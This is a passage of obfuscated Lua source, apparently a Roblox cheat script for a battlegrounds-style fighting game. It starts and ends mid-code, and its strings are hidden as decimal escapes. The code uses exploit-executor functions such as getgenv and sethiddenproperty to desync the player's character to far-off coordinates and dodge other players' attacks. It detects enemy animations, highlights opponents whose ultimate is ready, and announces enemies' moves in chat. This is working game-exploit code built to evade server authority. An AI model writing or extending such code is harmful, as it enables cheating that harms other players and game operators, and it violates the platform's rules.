 else local _IllIlIIIIl = game:GetService("\082\101\112\108\105\099\097\116\101\100\083\116\111\114\097\103\101"):FindFirstChild("\068\101\102\097\117\108\116\067\104\097\116\083\121\115\116\101\109\067\104\097\116\069\118\101\110\116\115") local _lllIlIllIl = _IllIlIIIIl and _IllIlIIIIl:FindFirstChild("\083\097\121\077\101\115\115\097\103\101\082\101\113\117\101\115\116") if _IllIlIIIIl and _lllIlIllIl then _lllIlIllIl:FireServer("\10071" .. _IlIlIIIlII.DisplayName .. "\032\117\115\101\100\032" .. moveName .. "\10071", "\097\108\108") end
 end
 end
 ) end
 end
 local function _IIIlIIllIl() return _IIIIlIlIII end
 local function _IIlIIIIIIl(_IIllIIlllI) local _IIlllllIlI = _IIllIIlllI and _IIllIIlllI:FindFirstChild("\068\101\097\116\104\067\111\117\110\116\101\114\085\108\116\072\105\103\104\108\105\103\104\116") if _IIlllllIlI then pcall( function () _IIlllllIlI:Destroy() end
 ) end
 end
 local function _llIIIIIIll(_IIllIIlllI) if not _IIllIIlllI or _IIllIIlllI.Name == "\087\101\097\107\101\115\116\032\068\117\109\109\121" then return end
 local _IllIIllllI = Players:GetPlayerFromCharacter(_IIllIIlllI) if not _IllIIllllI or _IllIIllllI == _llIlIIlIll then return end
 local _lllIIIIllI = _IIllIIlllI:FindFirstChild("\067\111\117\110\116\101\114") ~= nil local _IIllIIIlll = _IIIlIIllIl() and _IIllIIlllI:GetAttribute("\067\104\097\114\097\099\116\101\114") == "\066\097\108\100" and _IIllIIlllI:GetAttribute("\085\108\116\101\100") == true and not _lllIIIIllI local _IIlllllIlI = _IIllIIlllI:FindFirstChild("\068\101\097\116\104\067\111\117\110\116\101\114\085\108\116\072\105\103\104\108\105\103\104\116") if _IIllIIIlll then if not _IIlllllIlI then _IIlllllIlI = Instance.new("\072\105\103\104\108\105\103\104\116") _IIlllllIlI.Name = "\068\101\097\116\104\067\111\117\110\116\101\114\085\108\116\072\105\103\104\108\105\103\104\116" _IIlllllIlI.Adornee = _IIllIIlllI _IIlllllIlI.Parent = _IIllIIlllI end
 _IIlllllIlI.FillColor = Color3.fromRGB(0xFF, 0xFF, 0x0) _IIlllllIlI.OutlineColor = Color3.fromRGB(0xFF, 0xFF, 0x0) _IIlllllIlI.FillTransparency = 0.5 _IIlllllIlI.OutlineTransparency = 0x0 _IIlllllIlI.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop elseif _IIlllllIlI then pcall( function () _IIlllllIlI:Destroy() end
 ) end
 end
 local function _lIIIlIIlIl(_IIllIIlllI) if not _IIllIIlllI or _llIIlllIlI[_IIllIIlllI] then return end
 _llIIlllIlI[_IIllIIlllI] = true _llIIIIIIll(_IIllIIlllI) table.insert(_IllllIIIIl, _IIllIIlllI:GetAttributeChangedSignal("\085\108\116\101\100"):Connect( function () _llIIIIIIll(_IIllIIlllI) end
 )) table.insert(_IllllIIIIl, _IIllIIlllI:GetAttributeChangedSignal("\067\104\097\114\097\099\116\101\114"):Connect( function () _llIIIIIIll(_IIllIIlllI) end
 )) table.insert(_IllllIIIIl, _IIllIIlllI.ChildAdded:Connect( function (_IIIlIIIlII) if _lIIlIlIIlI(_IIIlIIIlII) then _llIIIIIIll(_IIllIIlllI) end
 end
 )) table.insert(_IllllIIIIl, _IIllIIlllI.ChildRemoved:Connect( function (_IIIlIIIlII) if _lIIlIlIIlI(_IIIlIIIlII) then _llIIIIIIll(_IIllIIlllI) end
 end
 )) end
 local function _IllllIlIIl(_IlIlIIIlII) if _IlIlIIIlII == _llIlIIlIll then return end
 if _IlIlIIIlII.Character then _lIIIlIIlIl(_IlIlIIIlII.Character) end
 table.insert(_IllllIIIIl, _IlIlIIIlII.CharacterAdded:Connect( function (_IIllIIlllI) task.wait(0.1) _lIIIlIIlIl(_IIllIIlllI) end
 )) end
 _lllIIllllI = function () for _lIIlIllIlI, _IlIlIIIlII in pairs(Players:GetPlayers()) do if _IlIlIIIlII.Character then _llIIIIIIll(_IlIlIIIlII.Character) end
 end
 end
 for _lIIlIllIlI, _IlIlIIIlII in pairs(Players:GetPlayers()) do _IllllIlIIl(_IlIlIIIlII) end
 table.insert(_IllllIIIIl, Players.PlayerAdded:Connect(_IllllIlIIl)) table.insert(_IllllIIIIl, Players.PlayerRemoving:Connect( function (_IlIlIIIlII) if _IlIlIIIlII.Character then _IIlIIIIIIl(_IlIlIIIlII.Character) end
 end
 )) table.insert(_IllIllIIll, function () for _lIIlIllIlI, _IllIIlIllI in pairs(_IllllIIIIl) do pcall(_IllIIlIllI.Disconnect, _IllIIlIllI) end
 _IllllIIIIl = {} _llIIlllIlI = setmetatable({}, { __mode = "\107" }) for _lIIlIllIlI, _IlIlIIIlII in pairs(Players:GetPlayers()) do if _IlIlIIIlII.Character then _IIlIIIIIIl(_IlIlIIIlII.Character) end
 end
 end
 ) _IIIlIlIIIl = {} _lIllIlllll = {} local _IllIIIlIll = false local _llIllIIlII = _llIlIIlIll.CharacterAdded:Connect( function () getgenv().desync = nil end
 ) _lIlIIlllIl = function (_lIlIIllIII) if not _lIlIIllIII then return false end
 local _llIIIIIlII = _lIlIIllIII:FindFirstAncestorWhichIsA("\077\111\100\101\108") if _llIIIIIlII and _llIIIIIlII:FindFirstChild("\067\111\117\110\116\101\114") then return true end
 for _lIIlIllIlI, _lIIIllllII in pairs(_lIlIIllIII:GetPlayingAnimationTracks()) do local _IlIIIllllI = _lIIIllllII.Animation.AnimationId if _IlIIIllllI:match("\049\051\055\050\054\050\050\054\057\048\053") or _IlIIIllllI:match("\049\051\055\050\054\050\051\053\052\049\053") then return true end
 end
 return false end
 _lIIIllIIII = function (_IlIlIIIlII, _IIllIIlllI) if not _IIllIIlllI then return end
 if _IIIlIlIIIl[_IlIlIIIlII] then pcall( function () _IIIlIlIIIl[_IlIlIIIlII]:Disconnect() end
 ) _IIIlIlIIIl[_IlIlIIIlII] = nil end
 repeat task.wait() until not _IIllIIlllI.Parent or (_IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") and _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100")) if not _IIllIIlllI.Parent then return end
 local _lllIIIIlIl = _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _llIIIIIIlI = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not (_lllIIIIlIl and _llIIIIIIlI) then return end
 local function _IllllIlIlI(_lIlIIllIII, _IlIIIllllI) local _IllIIllllI = tostring(_IlIIIllllI):match("\037\100\043") for _lIIlIllIlI, _lIIIllllII in pairs(_lIlIIllIII:GetPlayingAnimationTracks()) do if _lIIIllllII.Animation.AnimationId:match(_IllIIllllI) then return _lIIIllllII end
 end
 return nil end
 local _IllIIlIllI = _llIIIIIIlI.AnimationPlayed:Connect( function (_IlIlIlIlIl) if _IIIllIIlll.Unloaded then return end
 local _IIIIIIIlII = _IlIlIlIlIl.Animation.AnimationId local _IlIIIllIIl = _llIlIIlIll.Character local _llIllIIIII = _IlIIIllIIl and _IlIIIllIIl:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not (_IlIIIllIIl and _llIllIIIII) then return end
 task.spawn( function () if _IlIlIlIlIl.WeightTarget == 0x0 or _IlIlIlIlIl.Speed == 0x0 then return end
 local _IIllIIIIlI = CFrame.new(9e9, 9e9, 9e9) local _lIlIIlIIll = _IlIIIllIIl and _IlIIIllIIl:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local function _IIIIlIlIII(condFn) pcall( function () repeat getgenv().desync = { CFrame = _IIllIIIIlI } task.wait() local _IlIlIllIll = _llIlIIlIll.Character local _IIIlIIIIIl = _IlIlIllIll and _IlIlIllIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IllIllIIll = _IlIlIllIll and _IlIlIllIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not (_IlIlIllIll and _IIIlIIIIIl and _IllIllIIll) then return end
 _llIllIIIII = _IIIlIIIIIl _lIlIIlIIll = _IllIllIIll until condFn() end
 ) getgenv().desync = nil if _IlllIlIlII then local _lIlIllllll = _llIlIIlIll.Character and _llIlIIlIll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _lIlIllllll then pcall( function () sethiddenproperty(_lIlIllllll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 end
 end
 local function _IIIIlIIlIl(_lIlIIllIII) if not _lIlIIllIII then return false end
 local _llIIIIIlII = _lIlIIllIII:FindFirstAncestorWhichIsA("\077\111\100\101\108") return _llIIIIIlII and _llIIIIIlII:FindFirstChild("\067\111\117\110\116\101\114") and true or false end
 local function _IIIIIIIIII(size) local _lIIlIIlllI = Instance.new("\080\097\114\116", workspace) _lIIlIIlllI.Anchored = true _lIIlIIlllI.Size = size _lIIlIIlllI.CanCollide = false _lIIlIIlllI.Transparency = 0x1 local _IIlIIIlIII = false local _lllllllIll = _lIIlIIlllI.Touched:Connect( function (_IllIllIIll) if _IllIllIIll == _llIllIIIII or _IllIllIIll == getgenv().InvisPart30 then _IIlIIIlIII = true end
 end
 ) local _lIlllllIll = _lIIlIIlllI.TouchEnded:Connect( function (_IllIllIIll) if _IllIllIIll == _llIllIIIII or _IllIllIIll == getgenv().InvisPart30 then _IIlIIIlIII = false end
 end
 ) return _lIIlIIlllI, function () return _IIlIIIlIII end
 , function () pcall( function () _lIIlIIlllI:Destroy() end
 ) _lllllllIll:Disconnect() _lIlllllIll:Disconnect() end
 end
 local function _IllllIllII() local _llIlIlIlII = getgenv().InvisPart30 if getgenv().InvisActive and _llIlIlIlII then return _llIlIlIlII.Position end
 return _llIllIIIII.Position end
 if _IIIIIIIlII:match("\049\048\052\054\056\054\054\053\057\057\049") and rawget(_lIIlIllIlI.AntiMoves_Saitama.Value, "\065\110\116\105\032\078\111\114\109\097\108\032\080\117\110\099\104") then local _IllIllllIl = {} local _IIIlIllIlI = { CFrame.new(0x6, 0x0, -37.5) * CFrame.Angles(0x0, math.rad(-0x5), 0x0), CFrame.new(-0x6, 0x0, -37.5) * CFrame.Angles(0x0, math.rad(0x5), 0x0), CFrame.new(0x0, 0x0, -37.5), } local _IIIlIIIIlI = {Vector3.new(12.5,0x5,0x4B), Vector3.new(12.5,0x5,0x4B), Vector3.new(12.5,0x5,0x4B)} local _IIlIIIlIII = {false,false,false} local _lIIIlIIlII = {} for _IIIllIIIIl = 0x1, 0x3 do local _lIIlIIlllI = Instance.new("\080\097\114\116", workspace) _lIIlIIlllI.Anchored = true _lIIlIIlllI.Size = _IIIlIIIIlI[_IIIllIIIIl] _lIIlIIlllI.CanCollide = false _lIIlIIlllI.Transparency = 0x1 table.insert(_IllIllllIl, _lIIlIIlllI) local _IIllIllIll = _IIIllIIIIl table.insert(_lIIIlIIlII, _lIIlIIlllI.Touched:Connect( function (_IllIllIIll) if _IllIllIIll == _llIllIIIII or _IllIllIIll == getgenv().InvisPart30 then _IIlIIIlIII[_IIllIllIll] = true end
 end
 )) table.insert(_lIIIlIIlII, _lIIlIIlllI.TouchEnded:Connect( function (_IllIllIIll) if _IllIllIIll == _llIllIIIII or _IllIllIIll == getgenv().InvisPart30 then _IIlIIIlIII[_IIllIllIll] = false end
 end
 )) end
 local _lIIIllllII = tick() repeat for _IIIllIIIIl, _lIIlIIlllI in ipairs(_IllIllllIl) do _lIIlIIlllI.CFrame = _lllIIIIlIl.CFrame * _IIIlIllIlI[_IIIllIIIIl] end
 if (_IIlIIIlIII[0x1] or _IIlIIIlIII[0x2] or _IIlIIIlIII[0x3]) and not _lIlIIlllIl(_llIIIIIIlI) then getgenv().desync = { CFrame = _IIllIIIIlI } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _lIIIllllII + 0.8 or not _IlIlIlIlIl.IsPlaying getgenv().desync = nil for _lIIlIllIlI, _IlIlIllIll in ipairs(_lIIIlIIlII) do _IlIlIllIll:Disconnect() end
 for _lIIlIllIlI, _lIIlIIlllI in ipairs(_IllIllllIl) do pcall( function () _lIIlIIlllI:Destroy() end
 ) end
 end
 if _IIIIIIIlII:match("\049\048\052\054\054\057\055\052\056\048\048") and rawget(_lIIlIllIlI.AntiMoves_Saitama.Value, "\065\110\116\105\032\067\111\110\115\101\099\117\116\105\118\101\032\080\117\110\099\104\101\115") then local _lIIlIIlllI, isTouched, cleanup = _IIIIIIIIII(Vector3.new(12.5,0x5,12.5)) local _lIIIllllII = tick() repeat _lIIlIIlllI.CFrame = _lllIIIIlIl.CFrame * CFrame.new(0x0,0x0,-6.25) if isTouched() and not _lIlIIlllIl(_llIIIIIIlI) then getgenv().desync = { CFrame = _IIllIIIIlI } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _lIIIllllII + 1.5 or not _IlIlIlIlIl.IsPlaying getgenv().desync = nil cleanup() end
 if _IIIIIIIlII:match("\049\048\052\055\049\051\051\054\055\051\055") and rawget(_lIIlIllIlI.AntiMoves_Saitama.Value, "\065\110\116\105\032\083\104\111\118\101") then local _lIIlIIlllI, isTouched, cleanup = _IIIIIIIIII(Vector3.new(7.5,0x5,7.5)) _lIIlIIlllI.CFrame = _lllIIIIlIl.CFrame * CFrame.new(0x0,0x0,-3.75) local _lIIIllllII = tick() repeat _lIIlIIlllI.CFrame = _lllIIIIlIl.CFrame * CFrame.new(0x0,0x0,-3.75) if isTouched() and not _lIlIIlllIl(_llIIIIIIlI) then getgenv().desync = { CFrame = _IIllIIIIlI } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _lIIIllllII + 0.5 or not _IlIlIlIlIl.IsPlaying getgenv().desync = nil cleanup() end
 if _IIIIIIIlII:match("\049\050\053\049\048\049\055\048\057\056\056") and rawget(_lIIlIllIlI.AntiMoves_Saitama.Value, "\065\110\116\105\032\085\112\112\101\114\099\117\116") then task.wait(0.25) if not _IlIlIlIlIl.IsPlaying then return end
 local _lIIlIIlllI, isTouched, cleanup = _IIIIIIIIII(Vector3.new(0xA,0xA,0xA)) local _lIIIllllII = tick() repeat _lIIlIIlllI.CFrame = _lllIIIIlIl.CFrame * CFrame.new(0x0,0x0,-0x5) if isTouched() and not _lIlIIlllIl(_llIIIIIIlI) then getgenv().desync = { CFrame = _IIllIIIIlI } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _lIIIllllII + 0.5 or not _IlIlIlIlIl.IsPlaying getgenv().desync = nil cleanup() end
 if _IIIIIIIlII:match("\049\050\057\056\051\051\051\051\055\051\051") and _IIllIIlllI:GetAttribute("\085\108\116\101\100") ~= nil then MoveNotify(_IlIlIIIlII, "\083\101\114\105\111\117\115\032\080\117\110\099\104") end
 if _IIIIIIIlII:match("\049\050\057\056\051\051\051\051\055\051\051") and rawget(_lIIlIllIlI.AntiMoves_Saitama.Value, "\065\110\116\105\032\083\101\114\105\111\117\115\032\080\117\110\099\104") and _IIllIIlllI:GetAttribute("\085\108\116\101\100") ~= nil then task.delay(0x1, function () if _IIllIIlllI:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108", true) and _IIllIIlllI:FindFirstChild("\070\114\101\101\122\101") then task.wait(4.25) local _lIIIllllII = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x96 or tick() >= _lIIIllllII + 0x2 or not _IlIlIlIlIl.IsPlaying end
 ) end
 end
 ) end
 if _IIIIIIIlII:match("\049\049\051\054\053\053\054\051\050\053\053") and _IIllIIlllI:GetAttribute("\085\108\116\101\100") ~= nil then MoveNotify(_IlIlIIIlII, "\084\097\098\108\101\032\070\108\105\112") end
 if _IIIIIIIlII:match("\049\049\051\054\053\053\054\051\050\053\053") and rawget(_lIIlIllIlI.AntiMoves_Saitama.Value, "\065\110\116\105\032\084\097\098\108\101\032\070\108\105\112") and _IIllIIlllI:GetAttribute("\085\108\116\101\100") ~= nil then task.delay(0x1, function () if _IIllIIlllI:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108", true) and _IIllIIlllI:FindFirstChild("\070\114\101\101\122\101") then task.wait(0x3) local _lIlllllIlI = tick() _IIIIlIlIII( function () return tick() >= _lIlllllIlI + 2.5 end
 ) end
 end
 ) end
 if _IIIIIIIlII:match("\049\051\057\050\055\054\049\050\057\053\049") and _IIllIIlllI:GetAttribute("\085\108\116\101\100") ~= nil then MoveNotify(_IlIlIIIlII, "\079\109\110\105\045\068\105\114\101\099\116\105\111\110\097\108\032\080\117\110\099\104") end
 if _IIIIIIIlII:match("\049\051\057\050\055\054\049\050\057\053\049") and rawget(_lIIlIllIlI.AntiMoves_Saitama.Value, "\065\110\116\105\032\079\109\110\105\045\068\105\114\101\099\116\105\111\110\097\108\032\080\117\110\099\104") and _IIllIIlllI:GetAttribute("\085\108\116\101\100") ~= nil then local _lIIIIIIlIl = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x96 or tick() >= _lIIIIIIlIl + 2.5 end
 ) end
 if _IIIIIIIlII:match("\049\050\051\052\050\049\052\049\052\054\052") and rawget(_lIIlIllIlI.AntiMoves_Garou.Value, "\065\110\116\105\032\071\097\114\111\117\032\085\108\116") then task.wait(3.5) local _IIIllIIlIl = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x7D or tick() >= _IIIllIIlIl + 1.25 end
 ) end
 if _IIIIIIIlII:match("\049\050\052\054\051\048\055\050\054\055\057") and rawget(_lIIlIllIlI.AntiMoves_Garou.Value, "\065\110\116\105\032\070\105\110\097\108\032\072\117\110\116") then local _IlIlIlllll = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x19 or tick() >= _IlIlIlllll + 0.75 end
 ) end
 if _IIIIIIIlII:match("\049\050\050\055\050\056\057\052\050\049\053") and rawget(_lIIlIllIlI.AntiMoves_Garou.Value, "\065\110\116\105\032\070\108\111\119\105\110\103\032\087\097\116\101\114") then local _lIIlIIlllI, isTouched, cleanup = _IIIIIIIIII(Vector3.new(0xA,0x5,0xA)) local _lIIIllllII = tick() repeat _lIIlIIlllI.CFrame = _lllIIIIlIl.CFrame * CFrame.new(0x0,0x0,-0x5) if isTouched() and not _lIlIIlllIl(_llIIIIIIlI) then getgenv().desync = { CFrame = _IIllIIIIlI } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _lIIIllllII + 0.5 or not _IlIlIlIlIl.IsPlaying getgenv().desync = nil cleanup() end
 if _IIIIIIIlII:match("\049\050\050\055\051\049\056\056\055\053\052") and rawget(_lIIlIllIlI.AntiMoves_Garou.Value, "\065\110\116\105\032\070\108\111\119\105\110\103\032\087\097\116\101\114") then local _lIIlIIlllI, isTouched, cleanup = _IIIIIIIIII(Vector3.new(0xF,0x5,0xF)) local _lIIIllllII = tick() repeat _lIIlIIlllI.CFrame = _lllIIIIlIl.CFrame * CFrame.new(0x0,0x0,-7.5) if isTouched() and not _lIlIIlllIl(_llIIIIIIlI) then getgenv().desync = { CFrame = _IIllIIIIlI } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _lIIIllllII + 0x2 or not _IlIlIlIlIl.IsPlaying getgenv().desync = nil cleanup() end
 if _IIIIIIIlII:match("\049\052\051\055\052\051\053\055\051\053\049") and rawget(_lIIlIllIlI.AntiMoves_Garou.Value, "\065\110\116\105\032\070\108\111\119\105\110\103\032\087\097\116\101\114") then local _lIIlIIlllI, isTouched, cleanup = _IIIIIIIIII(Vector3.new(0xA,0x5,0xF)) local _lIIIllllII = tick() repeat _lIIlIIlllI.CFrame = _lllIIIIlIl.CFrame * CFrame.new(0x0,0x0,-7.5) if isTouched() and not _lIlIIlllIl(_llIIIIIIlI) then getgenv().desync = { CFrame = _IIllIIIIlI } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _lIIIllllII + 1.5 or not _IlIlIlIlIl.IsPlaying getgenv().desync = nil cleanup() task.wait(0.5) local _lIlllIllIl = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x19 or tick() >= _lIlllIllIl + 1.25 end
 ) end
 if _IIIIIIIlII:match("\049\050\050\057\054\056\056\050\052\050\055") and rawget(_lIIlIllIlI.AntiMoves_Garou.Value, "\065\110\116\105\032\076\101\116\104\097\108\032\087\104\105\114\108\119\105\110\100\032\083\116\114\101\097\109") then local _lIIIllllII = tick() _IIIIlIlIII( function () return (_IllllIllII() - (_lllIIIIlIl.CFrame * CFrame.new(0x0,0x0,-2.5)).Position).Magnitude > 0xA or _lIlIIlllIl(_llIIIIIIlI) or tick() >= _lIIIllllII + 0.5 end
 ) end
 if _IIIIIIIlII:match("\049\050\050\057\054\049\049\051\057\056\054") and rawget(_lIIlIllIlI.AntiMoves_Garou.Value, "\065\110\116\105\032\076\101\116\104\097\108\032\087\104\105\114\108\119\105\110\100\032\083\116\114\101\097\109") then local _lIIIllllII = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0xF or tick() >= _lIIIllllII + 0.5 end
 ) task.delay(1.35, function () local _lIlllIllIl = tick() repeat task.wait() until (_IllllIllII() - _lllIIIIlIl.Position).Magnitude <= 0xF or tick() >= _lIlllIllIl + 0.65 if (_IllllIllII() - _lllIIIIlIl.Position).Magnitude <= 0xF then local _IIlIlIIIll = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0xF or tick() >= _IIlIlIIIll + 0.65 end
 ) end
 end
 ) end
 if _IIIIIIIlII:match("\049\052\055\057\056\054\048\056\056\051\056") and rawget(_lIIlIllIlI.AntiMoves_Garou.Value, "\065\110\116\105\032\076\101\116\104\097\108\032\087\104\105\114\108\119\105\110\100\032\083\116\114\101\097\109") then task.delay(0.75, function () local _lIIIllllII = tick() repeat task.wait() until (_IllllIllII() - _lllIIIIlIl.Position).Magnitude <= 0x19 or tick() >= _lIIIllllII + 0.75 if (_IllllIllII() - _lllIIIIlIl.Position).Magnitude <= 0x19 then local _lIlllIllIl = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x19 or tick() >= _lIlllIllIl + 0.75 end
 ) end
 end
 ) end
 if _IIIIIIIlII:match("\049\050\051\048\055\054\053\054\054\049\054") and rawget(_lIIlIllIlI.AntiMoves_Garou.Value, "\065\110\116\105\032\072\117\110\116\101\114\115\032\071\114\097\115\112") then local _lIIIllllII = tick() _IIIIlIlIII( function () return (_IllllIllII() - (_lllIIIIlIl.CFrame * CFrame.new(0x0,0x0,-2.5)).Position).Magnitude > 0xA or _lIlIIlllIl(_llIIIIIIlI) or tick() >= _lIIIllllII + 0.35 end
 ) end
 if _IIIIIIIlII:match("\049\051\054\048\051\051\057\054\057\051\057") and rawget(_lIIlIllIlI.AntiMoves_Garou.Value, "\065\110\116\105\032\080\114\101\121\115\032\080\101\114\105\108") then local _lIIIllllII = tick() _IIIIlIlIII( function () return (_IllllIllII() - (_lllIIIIlIl.CFrame * CFrame.new(0x0,0x0,-0x1)).Position).Magnitude > 7.5 or _lIlIIlllIl(_llIIIIIIlI) or tick() >= _lIIIllllII + 2.5 end
 ) end
 if _IIIIIIIlII:match("\049\050\052\054\048\057\055\055\050\055\048") and rawget(_lIIlIllIlI.AntiMoves_Garou.Value, "\065\110\116\105\032\087\097\116\101\114\032\083\116\114\101\097\109\032\082\111\099\107\032\083\109\097\115\104\105\110\103\032\070\105\115\116") then local _lIIlIIlllI, isTouched, cleanup = _IIIIIIIIII(Vector3.new(12.5,0x5,12.5)) local _lIIIllllII = tick() repeat _lIIlIIlllI.CFrame = _lllIIIIlIl.CFrame * CFrame.new(0x0,0x0,-6.25) if isTouched() and not _lIlIIlllIl(_llIIIIIIlI) then getgenv().desync = { CFrame = _IIllIIIIlI } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _lIIIllllII + 1.85 or not _IlIlIlIlIl.IsPlaying getgenv().desync = nil cleanup() end
 if _IIIIIIIlII:match("\049\052\048\053\055\050\051\049\057\055\054") and rawget(_lIIlIllIlI.AntiMoves_Garou.Value, "\065\110\116\105\032\082\111\099\107\032\083\112\108\105\116\116\105\110\103\032\070\105\115\116") then local _lIIIllllII = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0xA or tick() >= _lIIIllllII + 0.5 end
 ) task.wait(0.5) local _lIlllIllIl = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0xA or _lIlIIlllIl(_llIIIIIIlI) or tick() >= _lIlllIllIl + 1.25 end
 ) end
 if _IIIIIIIlII:match("\049\051\054\051\048\055\056\054\056\052\054") and rawget(_lIIlIllIlI.AntiMoves_Garou.Value, "\065\110\116\105\032\067\114\117\115\104\101\100\032\082\111\099\107") then local _lIIlIIlllI, isTouched, cleanup = _IIIIIIIIII(Vector3.new(0x19,0xA,0x4B)) local _lIIIllllII = tick() repeat _lIIlIIlllI.CFrame = _lllIIIIlIl.CFrame * CFrame.new(0x0,0x0,-37.5) if isTouched() and not _lIlIIlllIl(_llIIIIIIlI) then getgenv().desync = { CFrame = _IIllIIIIlI } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _lIIIllllII + 1.5 or not _IlIlIlIlIl.IsPlaying getgenv().desync = nil cleanup() end
 if _IIIIIIIlII:match("\055\050\052\053\049\055\049\053\053\056\051\050\050\053") and rawget(_lIIlIllIlI.AntiMoves_Garou.Value, "\065\110\116\105\032\067\114\117\115\104\101\100\032\082\111\099\107") then local _lIIIllllII = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0xF or tick() >= _lIIIllllII + 0.75 end
 ) end
 if _IIIIIIIlII:match("\049\051\056\049\051\057\053\053\049\052\057") and _llIIllIlll.AntiMoves_Trashcan and _llIIllIlll.AntiMoves_Trashcan.Value then if (_IllllIllII() - _lllIIIIlIl.Position).Magnitude <= 0x19 then getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } task.wait(0.75) getgenv().desync = nil end
 local _llIIllIIIl = nil _llIIllIIIl = workspace.Thrown.ChildAdded:Connect( function (_lIIlIIlllI) if _lIIlIIlllI:IsA("\077\101\115\104\080\097\114\116") and _lIIlIIlllI.Name:lower() == "\116\114\097\115\104\032\099\097\110" then _llIIllIIIl:Disconnect() local _lIIIllllII = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lIIlIIlllI.Position).Magnitude > 0x19 or tick() >= _lIIIllllII + 0x2 end
 ) end
 end
 ) end
 if _IIIIIIIlII:match("\049\053\049\050\056\056\052\057\048\052\055") then MoveNotify(_IlIlIIIlII, "\068\101\097\116\104\032\066\108\111\119") end
 if _IIIIIIIlII:match("\049\053\049\050\056\056\052\057\048\052\055") and rawget(_lIIlIllIlI.AntiMoves_MetalBat.Value, "\065\110\116\105\032\068\101\097\116\104\032\066\108\111\119") then local _IlIllIlIll = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x64 or _IllllIlIlI(_llIIIIIIlI, "\049\053\049\050\051\054\054\053\052\057\049") or tick() >= _IlIllIlIll + 0x3 end
 ) end
 if _IIIIIIIlII:match("\049\053\051\057\049\051\050\051\052\052\049") and rawget(_lIIlIllIlI.AntiMoves_AtomicSamurai.Value, "\065\110\116\105\032\065\116\111\109\105\099\032\083\097\109\117\114\097\105\032\085\108\116") then task.wait(5.5) local _IIlIIIlIll = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x7D or tick() >= _IIlIIIlIll + 0x1 end
 ) end
 if _IIIIIIIlII:match("\049\054\048\056\050\049\050\051\055\049\050") and rawget(_lIIlIllIlI.AntiMoves_AtomicSamurai.Value, "\065\110\116\105\032\065\116\111\109\105\099\032\083\108\097\115\104") then task.wait(2.5) local _IIIlIIIIll = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x32 or tick() >= _IIIlIIIIll + 1.5 end
 ) end
 if _IIIIIIIlII:match("\049\052\055\049\057\050\057\048\051\050\056") and rawget(_lIIlIllIlI.AntiMoves_MetalBat.Value, "\065\110\116\105\032\083\097\118\097\103\101\032\084\111\114\110\097\100\111") then if (_IllllIllII() - _lllIIIIlIl.Position).Magnitude <= 0x32 then getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } end
 task.wait(0.5) if _IlIlIlIlIl.IsPlaying then local _lIIIllllII = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x32 or _IIIIlIIlIl(_lIlIIlIIll) or tick() >= _lIIIllllII + 3.5 or not _IlIlIlIlIl.IsPlaying end
 ) end
 end
 if _IIIIIIIlII:match("\049\053\053\050\048\049\051\050\050\051\051") and rawget(_lIIlIllIlI.AntiMoves_AtomicSamurai.Value, "\065\110\116\105\032\083\117\110\115\101\116") then local _lIIIllllII = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x32 or _IIIIlIIlIl(_lIlIIlIIll) or tick() >= _lIIIllllII + 3.3 or not _IlIlIlIlIl.IsPlaying end
